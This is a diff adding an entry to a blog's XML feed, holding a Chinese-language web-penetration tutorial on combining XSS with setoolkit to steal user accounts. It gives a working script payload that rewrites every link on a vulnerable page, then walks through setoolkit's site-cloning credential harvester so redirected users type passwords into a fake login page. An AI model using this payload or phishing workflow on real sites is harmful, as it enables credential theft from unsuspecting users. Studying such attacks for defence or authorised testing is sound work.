@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>xss跨站脚本分类</title>
+    <link href="/2020/08/06/xss+setookit%E7%9B%97%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/"/>
+    <url>/2020/08/06/xss+setookit%E7%9B%97%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/</url>
+    
+    <content type="html"><![CDATA[<h1 id="XSS-setookit盗取账户信息"><a href="#XSS-setookit盗取账户信息" class="headerlink" title="XSS+setookit盗取账户信息"></a>XSS+setookit盗取账户信息</h1><h3 id="xss修改网页链接"><a href="#xss修改网页链接" class="headerlink" title="xss修改网页链接"></a>xss修改网页链接</h3><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li>存在xss漏洞的地方，将当前网页的a标签里的<code>href</code>链接全部修改成恶意链接。</li></ul><pre><code class="hljs javascript">payload：&lt;script&gt;<span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">var</span> link=<span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">"a"</span>);<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;link.length;j++)&#123;  link[j].href=<span class="hljs-string">"http://baidu.com"</span>;&#125;&#125;&lt;<span class="hljs-regexp">/script&gt;</span></code></pre><h2 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h2><pre><code class="hljs javascript">代码解析<span class="hljs-built_in">window</span>.onload() 方法用于在网页加载完毕后立刻执行的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。<span class="hljs-keyword">var</span>  用来创建一个变量，这里就是创建了link<span class="hljs-built_in">document</span>.getElementsByTagName 返回带有指定标签名的对象的集合j=<span class="hljs-number">0</span>开始<span class="hljs-keyword">for</span>循环，如果j的值小于link的长度j在原来的值上+<span class="hljs-number">1</span>每循环一次就遍历新的link对象也就是把a标签的连接网址改成指定的网址这段代码插入到目标网站存在XSS漏洞的网页中，当前页面的a标签里的herf 链接都会被替换成指定的url</code></pre><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><table><thead><tr><th align="center"><code>插入payload后当前页面所有的a标签里href链接全部被修改成恶意链接</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827030148.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><p>反射型xss的话，刷新页面会恢复原来链接</p></li><li><p>如果是插入到存储型XSS中，那么会持久的替换网页的a标签的链接，造成很大的破坏</p></li><li><p>进一步扩大伤害的话可以配合beef进行(这里只是提一下，不会赘述)。</p></li></ul><h2 id="盗取用户信息"><a href="#盗取用户信息" class="headerlink" title="盗取用户信息"></a>盗取用户信息</h2><ul><li>盗取原理：克隆网站登录页面，利用XSS漏洞篡改网页链接，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，账号密码被存储</li></ul><h2 id="setookit"><a href="#setookit" class="headerlink" title="setookit"></a>setookit</h2><ul><li>setoolkit 是一款很强的社工工具，本次只是利用它其中的网站克隆功能</li><li>克隆步骤</li></ul><table><thead><tr><th align="center"><code>kali终端输入setooklit，进入选择页面，输入1，选择社会工程学</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031314.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>再选择2，网站攻击载体</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031452.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>再选择3，凭证攻击方法</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031529.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>选择2，网站克隆</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031612.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>ip地址选择默认，使用kali的地址即可，回车下一步</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031643.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>输入需要克隆的目标网页，然后回车，开始钓鱼</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031727.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>在url输入kali的地址，访问，发现已经克隆下来</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031801.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h2><ul><li>用户点击利用xss漏洞所修改的链接时，会自动跳转</li></ul><table><thead><tr><th align="center"><code>重定向到了setookit克隆的登录页面</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827032102.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>当用户看到这个页面输入密码后,什么反应都没有但是kali已经读取到密码</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827032349.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>利用xss篡改网页链接，比较麻烦的就是构造恶意<code>JavaScript</code>代码</p></li><li><p>setookit功能较多，第一次上手需要了解一下各个功能的作用</p></li></ul>]]></content>
+    
+    
+    <categories>
+      
+      <category>Web penetration</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>xss</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>xss窃取cookie利用</title>
     <link href="/2020/08/05/xss%E7%AA%83%E5%8F%96cookie%E5%88%A9%E7%94%A8/"/>
     <url>/2020/08/05/xss%E7%AA%83%E5%8F%96cookie%E5%88%A9%E7%94%A8/</url>
